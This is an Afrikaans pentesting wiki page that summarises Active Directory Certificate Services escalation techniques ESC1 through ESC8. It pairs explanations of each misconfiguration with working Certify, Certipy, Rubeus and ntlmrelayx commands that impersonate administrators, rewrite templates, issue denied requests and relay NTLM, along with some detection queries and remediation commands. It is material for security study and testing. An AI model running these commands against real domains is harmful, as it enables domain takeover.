# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Dit is 'n samevatting van die escalation technique-afdelings van die plasings:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Verkeerd gekonfigureerde Sertifikaat-sjablone - ESC1

### Verduideliking

### Verduideliking van Verkeerd gekonfigureerde Sertifikaat-sjablone - ESC1

- **Inskrywingsregte word deur die Enterprise CA aan laag-privilege gebruikers toegewys.**
- **Goedkeuring deur 'n bestuurder is nie vereis nie.**
- **Geen handtekeninge van gemagtigde personeel is nodig nie.**
- **Sekuriteitsbeskrywings op sertifikaat-sjablone is te toegeeflik, wat laag-privilege gebruikers toelaat om inskrywingsregte te bekom.**
- **Sertifikaat-sjablone is gekonfigureer om EKUs te definieer wat verifikasie fasiliteer:**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **Die vermoë vir verzoekers om 'n subjectAltName in die Certificate Signing Request (CSR) in te sluit, word deur die sjabloon toegelaat:**
- Die Active Directory (AD) prioritiseer die subjectAltName (SAN) in 'n sertifikaat vir identiteitkontrole indien dit teenwoordig is. Dit beteken dat deur die SAN in 'n CSR te spesifiseer, 'n sertifikaat aangevra kan word om enige gebruiker te imiteer (bv. 'n domeinadministrateur). Of 'n SAN deur die aansoeker gespesifiseer mag word, word aangedui in die sertifikaat-sjabloon se AD-objek deur die `mspki-certificate-name-flag` eienskap. Hierdie eienskap is 'n bitmasker, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag laat die aansoeker toe om die SAN te spesifiseer.

> [!CAUTION]
> Die gekonfigureerde opset laat laag-privilege gebruikers toe om sertifikate met enige SAN van keuse aan te vra, wat verifikasie as enige domein-prinsipaal deur Kerberos of SChannel moontlik maak.

Hierdie funksie is soms geaktiveer om die on-the-fly generering van HTTPS- of gasheersertifikate deur produkte of deployment-dienste te ondersteun, of as gevolg van 'n gebrek aan begrip.

Daar word opgemerk dat die skep van 'n sertifikaat met hierdie opsie 'n waarskuwing veroorsaak, wat nie die geval is wanneer 'n bestaande sertifikaat-sjabloon (soos die `WebServer` sjabloon, wat `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer het) gedupliseer en dan gewysig word om 'n authentication OID in te sluit nie.

### Misbruik

Om **kwetsbare sertifikaat-sjablone te vind** kan jy die volgende uitvoer:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Om **hierdie kwesbaarheid te misbruik om 'n administrateur na te boots** kon iemand die volgende uitvoer:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Dan kan jy die gegenereerde **sertifikaat na `.pfx`**-formaat omskakel en dit weer gebruik om te **authentiseer met Rubeus of certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows binaries "Certreq.exe" & "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die enumerasie van sertifikaat-sjablone binne die AD Forest se konfigurasieskema, spesifiek dié wat nie goedkeuring of handtekeninge vereis nie, wat 'n Client Authentication of Smart Card Logon EKU het, en met die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag aangeskakel is, kan uitgevoer word deur die volgende LDAP-query uit te voer:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Verkeerd gekonfigureerde sertifikaat-sjablone - ESC2

### Verduideliking

Die tweede misbruikscenario is 'n variasie van die eerste:

1. Inskrywingsregte word deur die Enterprise CA aan gebruikers met lae regte verleen.
2. Die vereiste vir bestuurdergoedkeuring is gedeaktiveer.
3. Die behoefte aan gemagtigde handtekeninge is weggelaat.
4. 'n Te permissiewe sekuriteitsbeskrywer op die sertifikaat-sjabloon verleen sertifikaatinskrywingregte aan gebruikers met lae regte.
5. **Die sertifikaat-sjabloon is gedefinieer om die Any Purpose EKU in te sluit of geen EKU nie.**

Die **Any Purpose EKU** laat 'n aanvaller toe om 'n sertifikaat te bekom vir **any purpose**, insluitend client authentication, server authentication, code signing, ens. Dieselfde **tegniek wat vir ESC3 gebruik word** kan aangewend word om hierdie scenario uit te buit.

Sertifikate met **no EKUs**, wat as subordinate CA-sertifikate optree, kan vir **any purpose** uitgebuit word en kan **ook gebruik word om nuwe sertifikate te teken**. Daarom kan 'n aanvaller arbitrêre EKU's of velde in die nuwe sertifikate spesifiseer deur 'n subordinate CA-sertifikaat te gebruik.

Nuwe sertifikate wat vir **domain authentication** geskep word, sal egter nie werk nie as die subordinate CA nie deur die **`NTAuthCertificates`**-objek vertrou word nie, wat die verstekinstelling is. Nietemin kan 'n aanvaller steeds **nuwe sertifikate met any EKU** en arbitrêre sertifikaatwaardes skep. Hierdie sertifikate kan moontlik vir 'n wye reeks doeleindes **misbruik** word (bv. code signing, server authentication, ens.) en kan beduidende gevolge hê vir ander toepassings in die netwerk soos SAML, AD FS of IPSec.

Om sjablone wat by hierdie scenario pas binne die AD Forest se konfigurasieskema te lys, kan die volgende LDAP-query uitgevoer word:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Verkeerd gekonfigureerde Enrolment Agent-sjablone - ESC3

### Verduideliking

Hierdie scenario is soortgelyk aan die eerste en tweede, maar **misbruik** 'n **ander EKU** (Certificate Request Agent) en **2 verskillende sjablone** (daarom het dit 2 stelle vereistes),

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), in Microsoft-dokumentasie bekend as **Enrollment Agent**, laat 'n principal toe om vir 'n **sertifikaat** aansoek te doen namens 'n ander gebruiker.

Die **“enrollment agent”** doen aansoek in so 'n **sjabloon** en gebruik die gevolglike **sertifikaat om 'n CSR namens die ander gebruiker mede-onderteken**. Dit stuur dan die **mede-ondertekende CSR** na die CA, doen aansoek in 'n **sjabloon** wat **"enroll on behalf of"** toelaat, en die CA reageer met 'n **sertifikaat wat aan die “ander” gebruiker behoort**.

**Vereistes 1:**

- Registrasieregte word deur die Enterprise CA aan gebruikers met lae regte toegeken.
- Die vereiste vir bestuurdergoedkeuring word weggelaat.
- Geen vereiste vir gemagtigde handtekeninge nie.
- Die sekuriteitsdeskriptor van die sertifikaatsjabloon is te permissief en verleen registrasieregte aan gebruikers met lae regte.
- Die sertifikaatsjabloon sluit die Certificate Request Agent EKU in, wat die versoek van ander sertifikaatsjablone namens ander principals moontlik maak.

**Vereistes 2:**

- Die Enterprise CA verleen registrasieregte aan gebruikers met lae regte.
- Bestuurdergoedkeuring word omseil.
- Die sjabloon se skemasweergawe is óf 1 óf hoër as 2, en dit spesifiseer 'n Application Policy Issuance Requirement wat die Certificate Request Agent EKU vereis.
- 'n EKU wat in die sertifikaatsjabloon gedefinieer is, maak domeinauthentisering moontlik.
- Beperkings vir enrollment agents word nie op die CA toegepas nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om hierdie scenario te misbruik:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **gebruikers** wat toegelaat word om 'n **enrollment agent certificate** te **verkry**, die templates waarin **enrollment agents** toegelaat word om te registreer, en die **rekeninge** namens wie die enrollment agent mag optree, kan deur enterprise CAs beperk word. Dit word bereik deur die `certsrc.msc` **snap-in** oop te maak, **regsklik** op die CA te doen, **klik Properties**, en dan te **navigeer** na die “Enrollment Agents” tab.

Dit is egter opgemerk dat die **default** instelling vir CAs “**Do not restrict enrollment agents**.” is. Wanneer die beperking op enrollment agents deur administrateurs aangeskakel word deur dit op “Restrict enrollment agents” te stel, bly die verstekkonfigurasie uiters permissief. Dit gee **Everyone** toegang om op alle templates as enigiemand te registreer.

## Kwesbare Toegangsbeheer vir Sertifikaatsjablone - ESC4

### **Verduideliking**

Die **security descriptor** op **certificate templates** definieer die **permissions** wat spesifieke **AD principals** het ten opsigte van die template.

As 'n **aanvaller** die vereiste **permissions** besit om 'n **template** te **wysig** en enige **uitbuitbare misconfigurasies** uiteengesit in vorige afdelings te **instel**, kan privilege escalation gefasiliteer word.

Noemenswaardige permissions wat op certificate templates van toepassing is, sluit in:

- **Owner:** Gee implisiete beheer oor die objek, wat toelaat dat enige attributte gewysig word.
- **FullControl:** Bied volledige gesag oor die objek, insluitend die vermoë om enige attributte te verander.
- **WriteOwner:** Laat toe dat die eienaar van die objek verander word na 'n principal onder die beheer van die aanvaller.
- **WriteDacl:** Maak voorsiening vir die aanpassing van toegangbeheer, wat potensieel aan 'n aanvaller FullControl kan gee.
- **WriteProperty:** Machtig die redigering van enige eienskappe van die objek.

### Misbruik

Om principals met wysigingsregte op templates en ander PKI-objekte te identifiseer, enumereer met Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
'n voorbeeld van 'n privesc soos die vorige een:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer 'n gebruiker skryfbevoegdhede oor 'n sertifikaat-sjabloon het. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaat-sjabloon oor te skryf en die sjabloon vatbaar te maak vir ESC1.

Soos ons in die pad hierbo kan sien, het slegs `JOHNPC` hierdie bevoegdhede, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink` edge na `JOHNPC`. Aangesien hierdie tegniek verband hou met sertifikate, het ek hierdie aanval ook geïmplementeer, wat bekend staan as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hier is 'n klein kykie na Certipy se `shadow auto` kommando om die NT hash van die slagoffer te verkry.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kan die konfigurasie van 'n sertifikaatsjabloon met 'n enkele opdrag oorskryf. By **verstek**, Certipy sal die konfigurasie **oorskryf** om dit **kwesbaar vir ESC1** te maak. Ons kan ook die **`-save-old` parameter gebruik om die ou konfigurasie te stoor**, wat nuttig sal wees vir die **herstel** van die konfigurasie na ons aanval.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kwetsbare PKI-voorwerp Toegangsbeheer - ESC5

### Verduideliking

Die uitgebreide web van onderling geknoopte, op ACL-gebaseerde verhoudings, wat verskeie voorwerpe buite certificate templates en die certificate authority insluit, kan die veiligheid van die hele AD CS-stelsel beïnvloed. Hierdie voorwerpe, wat die veiligheid aansienlik kan raak, sluit in:

- Die AD computer object van die CA-bediener, wat deur meganismes soos S4U2Self of S4U2Proxy gekompromitteer kan word.
- Die RPC/DCOM-server van die CA-bediener.
- Enige afstammeling AD-voorwerp of container binne die spesifieke houerpad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit in, maar is nie beperk tot, houers en voorwerpe soos die Certificate Templates container, Certification Authorities container, die NTAuthCertificates object, en die Enrollment Services Container.

Die veiligheid van die PKI-stelsel kan ingeboet word as 'n aanvaller met lae regte beheer oor enige van hierdie kritieke komponente kry.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp bespreek in die [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) raak ook aan die implikasies van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag, soos uiteengesit deur Microsoft. Hierdie konfigurasie, wanneer dit op 'n Certification Authority (CA) geaktiveer is, laat die insluiting van **gebruikers-gedefinieerde waardes** in die **subject alternative name** toe vir **enige aanvraag**, insluitend dié wat uit Active Directory® opgebou is. Gevolglik laat hierdie bepaling 'n **indringer** toe om in te skryf via **enige template** wat op domein **authentisering** ingestel is — spesifiek dié wat oop is vir **gebruikers met lae regte** inskrywing, soos die standaard User template. Daardoor kan 'n sertifikaat verkry word wat die indringer in staat stel om as 'n domein administrateur of **enige ander aktiewe entiteit** binne die domein te autentiseer.

**Nota**: Die benadering om **alternative names** by 'n Certificate Signing Request (CSR) te voeg, deur die `-attrib "SAN:"` argument in `certreq.exe` (verwys na as “Name Value Pairs”), staan in **kontras** met die uitbuitingsstrategie van SANs in ESC1. Hier lê die onderskeid in **hoe rekeninginligting ingekapsel word** — binne 'n sertifikaatattribuut, eerder as 'n uitbreiding.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende opdrag met `certutil.exe` gebruik:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hierdie operasie gebruik in wese **remote registry access**, daarom kan 'n alternatiewe benadering wees:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Gereedskap soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) is in staat om hierdie miskonfigurasie te ontdek en dit uit te buit:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Om hierdie instellings te verander, mits iemand oor **domein administratiewe** regte of 'n ekwivalent beskik, kan die volgende opdrag vanaf enige werkstasie uitgevoer word:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Om hierdie konfigurasie in jou omgewing uit te skakel, kan die vlag verwyder word met:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Post die Mei 2022-sekuriteitsopdaterings, sal nuut uitgereikte **certificates** 'n **security extension** bevat wat die **requester's `objectSid` property** inkorporeer. Vir ESC1 word hierdie SID afgelei van die gespesifiseerde SAN. Vir **ESC6** weerspieël die SID egter die **requester's `objectSid`**, nie die SAN nie.\
> Om ESC6 te benut, is dit noodsaaklik dat die stelsel vatbaar is vir ESC10 (Weak Certificate Mappings), wat die **SAN bo die nuwe security extension** prioritiseer.

## Kwetsbare Sertifikaatowerheid Toegangsbeheer - ESC7

### Aanval 1

#### Verduideliking

Toegangsbeheer vir 'n sertifikaatowerheid word gehandhaaf deur 'n stel magtigings wat die optrede van die CA beheer. Hierdie magtigings kan besigtig word deur `certsrv.msc` te open, met die rechtermuisknop op 'n CA te klik, Eienskappe te kies, en dan na die Sekuriteit-oortjie te navigeer. Daarbenewens kan magtigings opgesom word met behulp van die PSPKI-module met opdragte soos:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dit verskaf insigte in die primêre regte, naamlik **`ManageCA`** en **`ManageCertificates`**, wat ooreenstem met die rolle van “CA-administrateur” en “Sertifikaatbestuurder” onderskeidelik.

#### Abuse

Om **`ManageCA`** regte op 'n sertifikaatowerheid te hê stel die hoofpersoon in staat om instellings op afstand te manipuleer met behulp van PSPKI. Dit sluit in die omskakeling van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag om SAN-spesifikasie in enige sjabloon toe te laat, 'n kritieke aspek van domein-eskalasie.

Die vereenvoudiging van hierdie proses is bereikbaar deur die gebruik van PSPKI se **Enable-PolicyModuleFlag** cmdlet, wat wysigings toelaat sonder direkte GUI-interaksie.

Die besit van **`ManageCertificates`** regte vergemaklik die goedkeuring van hangende versoeke, wat effektief die beskerming "CA certificate manager approval" omseil.

'n Kombinasie van **Certify** en **PSPKI** modules kan gebruik word om 'n sertifikaat aan te vra, goed te keur en af te laai:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Aanval 2

#### Verduideliking

> [!WARNING]
> In die **vorige aanval** **`Manage CA`** regte is gebruik om die **EDITF_ATTRIBUTESUBJECTALTNAME2** vlag te **aktiveer** om die **ESC6 attack** uit te voer, maar dit sal geen effek hê totdat die CA diens (`CertSvc`) herbegin word. Wanneer 'n gebruiker die `Manage CA` toegangsreg het, word die gebruiker ook toegelaat om die **diens te herbegin**. Dit beteken egter **nie dat die gebruiker die diens op afstand kan herbegin nie**. Verder mag E**SC6 moontlik nie uit die boks werk nie** in die meeste gepatchte omgewings weens die Mei 2022 sekuriteitsopdaterings.

Voorvereistes:

- Slegs **`ManageCA`** reg
- **`Manage Certificates`** toestemming (kan vanaf **`ManageCA`** gegee word)
- Sertifikaatsjabloon **`SubCA`** moet **geaktiveer** wees (kan vanaf **`ManageCA`** geaktiveer word)

Die tegniek berus op die feit dat gebruikers met die `Manage CA` _en_ `Manage Certificates` toegangsregte mislukte sertifikaataanvragte kan uitreik. Die `SubCA` sertifikaatsjabloon is **kwetsbaar vir ESC1**, maar **slegs administrateurs** kan in die sjabloon inskryf. Dus kan 'n **gebruiker** 'n **versoek** doen om in die **`SubCA`** in te skryf — wat **geweier** sal word — maar daarna deur die bestuurder **uitgereik** word.

#### Misbruik

Jy kan jouself die **`Manage Certificates`** toegangsreg gee deur jou gebruiker as 'n nuwe beampte by te voeg.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`** sjabloon kan **op die CA geaktiveer** word met die `-enable-template` parameter. Standaard is die `SubCA` sjabloon geaktiveer.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
As ons die voorvereistes vir hierdie aanval vervul het, kan ons begin deur **'n sertifikaat aan te vra gebaseer op die `SubCA`-sjabloon**.

**Hierdie versoek sal geweier word**, maar ons sal die private key stoor en die request ID neerskryf.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Met ons **`Manage CA` and `Manage Certificates`**, kan ons dan die **mislukte sertifikaatversoek uitreik** met die `ca` command en die `-issue-request <request ID>` parameter.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
En uiteindelik kan ons **die uitgereikte sertifikaat ophaal** met die `req` command en die `-retrieve <request ID>` parameter.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Aanval 3 – Manage Certificates Extension-misbruik (SetExtension)

#### Verduideliking

Benewens die klassieke ESC7-misbruik (aktiwiteit van EDITF-attribuut of goedkeuring van hangende versoeke), het **Certify 2.0** 'n splinternuwe primitive blootgelê wat slegs die *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) rol op die Enterprise CA vereis.

Die `ICertAdmin::SetExtension` RPC-metode kan deur enige prinsipal met *Manage Certificates* uitgevoer word. Terwyl die metode tradisioneel deur regmatige CAs gebruik is om uitbreidings op **hangende** versoeke by te werk, kan 'n aanvaller dit misbruik om 'n **nie-standaard** sertifikaatuitbreiding by te voeg (byvoorbeeld 'n pasgemaakte *Certificate Issuance Policy* OID soos `1.1.1.1`) aan 'n versoek wat wag op goedkeuring.

Omdat die teiken-sjabloon **nie 'n standaardwaarde vir daardie uitbreiding definieer nie**, sal die CA die aanvallerbeheerde waarde NIE oorskryf wanneer die versoek uiteindelik uitgereik word nie. Die resulterende sertifikaat bevat dus 'n aanvaller-gekose uitbreiding wat moontlik:

* Voldoen aan Application / Issuance Policy-vereistes van ander kwesbare sjablone (wat kan lei tot privilege escalation).
* Voeg addisionele EKUs of beleide by wat die sertifikaat onverwante vertroue in derdeparty-stelsels gee.

Kortliks kan *Manage Certificates* — voorheen beskou as die "minder magtige" helfte van ESC7 — nou aangewend word vir volle privilege escalation of langtermyn persistering, sonder om CA-konfigurasie aan te raak of die meer beperkende *Manage CA*-reg te benodig.

#### Misbruik van die primitive met Certify 2.0

1. **Dien 'n sertifikaataanvraag in wat *hangend* sal bly.** Dit kan afgedwing word met 'n sjabloon wat bestuurdergoedkeuring vereis:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Heg 'n pasgemaakte uitbreiding aan die hangende versoek** deur die nuwe `manage-ca`-opdrag te gebruik:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*As die sjabloon nie reeds die *Certificate Issuance Policies*-uitbreiding definieer nie, sal die waarde hierbo na uitreiking bewaar bly.*

3. **Reik die versoek uit** (as jou rol ook *Manage Certificates*-goedkeuringsregte het) of wag dat 'n operateur dit goedkeur. Sodra dit uitgereik is, laai die sertifikaat af:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Die resulterende sertifikaat bevat nou die kwaadwillige issuance-policy OID en kan in daaropvolgende aanvalle gebruik word (bv. ESC13, domain escalation, ens.).

> LET WEL: Dieselfde aanval kan met Certipy ≥ 4.7 deur die `ca`-opdrag en die `-set-extension`-parameter uitgevoer word.

## NTLM Relay na AD CS HTTP-endpunte – ESC8

### Verduideliking

> [!TIP]
> In omgewings waar **AD CS geïnstalleer is**, as 'n kwetsbare **web enrollment endpoint** bestaan en ten minste een **certificate template gepubliseer is** wat **domain computer enrollment en client authentication** toelaat (soos die standaard **`Machine`** template), kan **enige rekenaar met die spooler-diens aktief deur 'n aanvaller gekompromitteer word**!

Verskeie **HTTP-gebaseerde enrollment-metodes** word deur AD CS ondersteun en beskikbaar gemaak deur addisionele bedienerrolle wat administrateurs kan installeer. Hierdie koppelvlakke vir HTTP-gebaseerde sertifikaataanmelding is vatbaar vir **NTLM relay attacks**. 'n Aanvaller, vanaf 'n **gekompromitteerde masjien, kan enige AD-rekening naspeel wat via inkomende NTLM verifieer**. Terwyl die aanvaller die slagofferrekening naspeel, kan hy hierdie webkoppelvlakke gebruik om **'n client authentication-sertifikaat aan te vra met die `User` of `Machine` certificate templates**.

- Die **web enrollment interface** (’n ouer ASP-toepassing beskikbaar by `http://<caserver>/certsrv/`), gebruik standaard net HTTP, wat nie beskerming teen NTLM relay attacks bied nie. Daarbenewens laat dit eksplisiet slegs NTLM-authentisering toe via sy Authorization HTTP-header, wat meer veilige metodes soos Kerberos onbruikbaar maak.
- Die **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, en **Network Device Enrollment Service** (NDES) ondersteun standaard negotiate-authentisering via hul Authorization HTTP-header. Negotiate-authentisering **ondersteun beide** Kerberos en **NTLM**, wat 'n aanvaller toelaat om tydens relay-aanvalle na **NTLM af te gradeer**. Alhoewel hierdie webdienste standaard HTTPS aktiveer, beskerm HTTPS alleen **nie teen NTLM relay attacks** nie. Beskerming teen NTLM relay attacks vir HTTPS-dienste is slegs moontlik wanneer HTTPS met channel binding gekombineer word. Ongelukkig aktiveer AD CS nie Extended Protection for Authentication op IIS nie, wat vir channel binding vereis word.

'n Algemene **probleem** met NTLM relay attacks is die **korte duur van NTLM-sessies** en die onmoontlikheid vir die aanvaller om met dienste te kommunikeer wat **NTLM signing vereis**.

Nietemin, hierdie beperking word oorkom deur 'n NTLM relay attack te benut om 'n sertifikaat vir die gebruiker te verkry, aangesien die sertifikaat se geldigheidsperiode die sessie se duur bepaal, en die sertifikaat gebruik kan word met dienste wat **NTLM signing vereis**. Vir instruksies oor die gebruik van 'n gesteelde sertifikaat, verwys na:


{{#ref}}
account-persistence.md
{{#endref}}

Nog 'n beperking van NTLM relay attacks is dat **'n aanvaller-beheerde masjien deur 'n slagofferrekening geverifieer moet word**. Die aanvaller kan óf wag óf probeer om hierdie verifikasie te **dwing**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Misbruik**

Die `cas` van [**Certify**](https://github.com/GhostPack/Certify) som **geaktiveerde HTTP AD CS-endpunte** op:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers` eienskap word deur ondernemings-sertifikaatowerhede (CAs) gebruik om Certificate Enrollment Service (CES) eindpunte te stoor. Hierdie eindpunte kan ontleed en gelys word deur die hulpmiddel **Certutil.exe** te gebruik:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Misbruik met Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)

